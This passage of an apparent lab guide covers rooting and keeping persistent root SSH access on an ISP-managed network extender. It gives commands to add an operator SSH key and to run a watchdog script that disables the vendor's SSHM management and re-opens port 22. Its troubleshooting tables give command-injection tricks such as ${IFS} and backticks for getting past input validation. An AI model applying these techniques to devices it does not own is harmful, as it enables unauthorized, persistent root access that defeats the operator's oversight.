5. Every 15 seconds it checks and repairs SSHM, Dropbear, the password, and the NFM rule. Do not add the port-22 rule with plain `iptables`; NFM removes rules that are not part of the OVSDB expected state when it rebuilds.

#### Passwordless operator login on port 22: complete procedure

The steps below assume you have obtained a root shell once via 4B, or are already inside a UID-0 shell via the existing `operator@22`. `operator` is not a newly created account: it is built into the firmware and is the only stable username Dropbear accepts; its UID/GID are both 0 — neither `sudo` nor creating a new user is needed.

**1. Generate a dedicated RSA key on your machine.**

```bash
ssh-keygen -t rsa -b 3072 \
  -f ~/.ssh/sbe1v1k_operator_rsa \
  -N '' \
  -C 'sbe1v1k-operator-lab'
chmod 600 ~/.ssh/sbe1v1k_operator_rsa
cat ~/.ssh/sbe1v1k_operator_rsa.pub
```

RSA is used for compatibility with the old Dropbear on the device; do not copy the private key to the device.

**2. Install the public key in the device root shell.** Replace `<full RSA public key>` with the entire line from the `.pub` file. The `grep` check avoids appending duplicates.

```sh
mkdir -p /etc/dropbear
chmod 700 /etc/dropbear
grep -qxF '<full RSA public key>' /etc/dropbear/authorized_keys 2>/dev/null || \
  printf '%s\n' '<full RSA public key>' >> /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
ls -l /etc/dropbear/authorized_keys
```

`/etc/dropbear` is a bind mount of `/data/etc/dropbear` on p29, so the key survives reboots. Do not write to `/root/.ssh/authorized_keys`: the rootfs is read-only, and the `root` username itself is rejected by Dropbear.

**3. Install and start the port-22 manager.** The prepared script should live on p35: `/usr/app/sbe_lab_mgmt.sh`. After deploying it from the root shell the first time, make it executable and start it:

```sh
chmod 755 /usr/app/sbe_lab_mgmt.sh
nohup /usr/app/sbe_lab_mgmt.sh </dev/null >/dev/null 2>&1 &
sleep 3
```

The script disables SSHM, fixes the operator backup password hash, sets Dropbear to port 22, and opens TCP 22 to LAN (`br-home`) only via NFM. Do not replace it with manual `iptables` rules.

**4. Log in passwordless from your machine.**

```bash
ssh -p 22 \
  -i ~/.ssh/sbe1v1k_operator_rsa \
  -o IdentitiesOnly=yes \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  operator@192.168.1.1
```

Expected output: `uid=0(root) gid=0(root)`. Login should not ask for the operator password; the password is only an independent fallback channel.

If SSH reports `REMOTE HOST IDENTIFICATION HAS CHANGED`, first confirm this is the lab SBE, then remove the old host key record for that IP:

```bash
ssh-keygen -R 192.168.1.1
```

**5. Verify and close the temporary 9999 shell.**

```sh
id
pidof sbe_lab_mgmt.sh       # should show a PID
pidof sshm || echo 'sshm disabled'
/usr/opensync/bin/nfm_ip4tables.sh -C INPUT -i br-home -p tcp --dport 22 -j ACCEPT

# Once operator@22 is confirmed working, close the temporary Warehouse root shell:
killall inetd 2>/dev/null
rm -f /tmp/inetd.conf
```

Port `9999` is only for initial recovery or troubleshooting, not a daily management entry. Close it once key-based login on 22 is verified.

**6. Reboot boundary (must understand).** The public key and `/usr/app/sbe_lab_mgmt.sh` survive reboots, but until the `/etc/rc.local` launcher is actually flashed into inactive p28 and verified, a reboot will not start the manager automatically. After a reboot, use the Warehouse root shell again and run the `nohup` command from step 3 to restore 22.

Verified on hardware: both RSA key and password login on TCP 22 succeed, both return `uid=0(root) gid=0(root)`. After deliberately deleting the NFM rule and re-enabling SSHM, the script restored 22 and both login methods within one 15-second cycle.

Important correction: no fixed "root password reset every two minutes" was found on this unit. `/etc/init.d/boot` only sets the root password at boot from the uppercase serial; SSHM's `sshAuthPasswd` event modifies `operator`, not root. The password database lives in `/tmp/etc/shadow`, so the script above should still restore the operator state after every boot.

The complete reboot-persistence candidate only modifies the SquashFS `/etc/rc.local` to start `/usr/app/sbe_lab_mgmt.sh` in the background; the policy itself stays on p35, so the rootfs does not need to be rebuilt again. The candidate image should first be written to inactive p28 (keeping active p27) and tested with serial/U-Boot rollback conditions. The device reports `secboot=1`, so reboot persistence must not be claimed before a successful boot from p28.

---

## Troubleshooting

### Common (both firmware generations)

| Symptom | Cause and action |
|---|---|
| curl connection fails/times out | The maintenance host is not on a LAN port, or the device IP is not 192.168.1.1; check the topology: test network→WAN, maintenance host→LAN |
| `get_mode` returns `Cloud` | DNS record not effective or WAN lacks IPv6; check the test network config; **the SBE must be restarted after config changes** — modecheck runs only once at boot |
| SBE gets no IPv6 while all Xiaomi UCI settings look right | When the Xiaomi IPv6 mode is off, `network.lan.ipv6='0'` remains and netifd disables IPv6 on br-lan at the kernel level (`net.ipv6.conf.br-lan.disable_ipv6=1`); odhcpd logs `no public prefix on br-lan` and refuses to send RAs. Diagnose: `ip -6 addr show dev br-lan` (empty), `uci -q get network.lan.ipv6` (outputs 0). Fix: `uci delete network.lan.ipv6; uci commit network; /etc/init.d/network reload; sysctl -w net.ipv6.conf.br-lan.disable_ipv6=0`, restart odhcpd/dnsmasq, then power-cycle the SBE |
| `get_mode` returns `INVALID_REQUEST` | Used a method other than POST, or the body is empty |
| Second request has no effect | Attempt counters exhausted; clear `/tmp/update_attempt_file` and `/tmp/update_firmware_id` in the script, or reboot the device |

### Old Firmware 1.0.5

| Symptom | Cause and action |
|---|---|
| Port 22 not open after the request | ① Wait (the tftp part runs first, up to a few minutes) ② the payload contains a space (must use `${IFS}`) ③ it contains `&` ④ attempt counters exhausted |
| SSH password wrong | The password is the serial number in **uppercase**; confirm with `get_serial` |

### New Firmware 1.1.3.1

| Symptom | Cause and action |
|---|---|
| `INVALID_REQUEST_CHARACTER` | The payload contains `;` `$` `\|` `'` `"` (body validation); switch to 4B's backtick + script delivery |
| Stuck in `FWS:Working` for a long time | ① `tftpserver` includes `:port` (device hangs; **power-cycle to recover**) ② the script floods stderr and fills the popen pipe |
| Script ran but 22 is unreachable | Check the OVSDB rule with `nfm_ip4tables.sh -C INPUT -i br-home -p tcp --dport 22 -j ACCEPT`; do not insert raw iptables rules |
| Correct password/key still fails to log in | The username must not be `root` or a self-created account; use the UID-0 `operator` |
| SSHM changes the state back | Check `ovsh s Node_Services -w service==sshm service enable status`; the management script restores it to disabled |
| Port 22 disappears after reboot | The p35 script persists, but the rootfs `/etc/rc.local` launcher is not flashed yet; re-obtain a shell and run `/usr/app/sbe_lab_mgmt.sh &`, or complete the inactive p28 candidate boot test |

---
